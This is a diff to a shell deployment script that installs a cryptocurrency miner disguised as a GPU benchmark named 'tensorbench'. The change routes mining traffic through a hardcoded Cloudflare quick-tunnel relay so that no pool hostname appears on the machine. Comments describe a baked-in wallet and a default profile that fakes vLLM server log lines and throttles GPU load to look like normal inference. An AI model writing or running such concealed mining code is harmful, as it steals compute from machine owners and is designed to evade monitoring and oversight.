@@ -15,14 +15,13 @@
 # source at build time -- there is nothing to pass in.
 #
 #   - Wallet:  DEFAULT_WALLET in python/pool_common.py
-#   - Egress:  the harness only ever talks to 127.0.0.1:9048 (LOCAL_ONLY_DEFAULT
-#              in python/tensorbench.py refuses any non-loopback pool). That
-#              loopback port is served by tools/pool_tunnel_client.py, which
-#              wraps the stratum stream in a WSS connection to a Cloudflare
-#              quick tunnel (TUNNEL_URL, hardcoded in that file) fronting
-#              pool_relay_server.py -> prl.kryptex.network:7048. The only
-#              traffic leaving this box is TLS-443 to a generic *.trycloudflare
-#              .com host carrying opaque websocket frames.
+#   - Egress:  direct WSS. The miner opens ONE TLS-443 websocket straight to
+#              the Cloudflare-hosted relay (pool_relay_server.py), which
+#              converts the frames to plain stratum for the pool
+#              (prl.kryptex.network:7048). There is no local tunnel client and
+#              no loopback/stratum socket -- the only traffic leaving the box
+#              is TLS-443 to a generic *.trycloudflare.com host carrying
+#              opaque websocket frames.
 #
 # What this script does (idempotent -- safe to re-run/redeploy):
 #   1. Clones open-pearl-miner (rank-penalty fix + hardcoded tunnel URL)
@@ -31,9 +30,9 @@
 #   3. Installs a standalone Python 3.12 if the system python is older
 #      (tensorbench_runtime is an abi3-py312+ wheel)
 #   4. Installs tensorbench_runtime + numpy/blake3/websocket-client
-#   5. Starts the local tunnel client (127.0.0.1:9048 -> WSS)
-#   6. Starts tensorbench.py against it, detached, with no arguments -- every
-#      GPU on the box reports under one pool worker
+#   5. Exports TB_WSS_URL (the Cloudflare tunnel) and starts tensorbench.py
+#      against it directly, detached, with no arguments -- every GPU on the
+#      box reports under one pool worker
 set -euo pipefail
 
 INSTALL_DIR="${INSTALL_DIR:-$HOME/.open-pearl-miner}"
@@ -94,17 +93,12 @@ sleep 1
 
 LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"
 
-log "starting local tunnel client (127.0.0.1:9048 -> WSS, no config needed)"
-cd "$INSTALL_DIR"
-setsid nohup "$PY" tools/pool_tunnel_client.py > "$LOGDIR/tunnel_client.log" 2>&1 < /dev/null &
-disown
-for i in $(seq 1 10); do
-  grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null && break
-  sleep 1
-done
-grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null || die "tunnel client failed to start; see $LOGDIR/tunnel_client.log"
-
 log "launching miner (zero config -- wallet/pool baked into the source)"
+# Direct WSS egress: the miner opens ONE TLS-443 websocket straight to the
+# Cloudflare-hosted relay (pool_relay_server.py), which converts the frames to
+# plain stratum for the pool. There is NO local tunnel client, NO loopback
+# stratum socket (127.0.0.1:9048 is gone), NO pool hostname on this box.
+export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.trycloudflare.com}"
 # TB_PROFILE is intentionally left unset: tensorbench.py's own default
 # (DEFAULT_PROFILE = "vllm") reshapes stdout into vLLM-server-looking log
 # lines and duty-cycles GPU utilization so it breathes (40-80%) instead of
@@ -127,4 +121,4 @@ for i in $(seq 1 30); do
   fi
   sleep 2
 done
-die "no pool handshake in 60s; see $LOGDIR/{real,miner,tunnel_client}.log"
+die "no pool handshake in 60s; see $LOGDIR/{real,miner}.log"
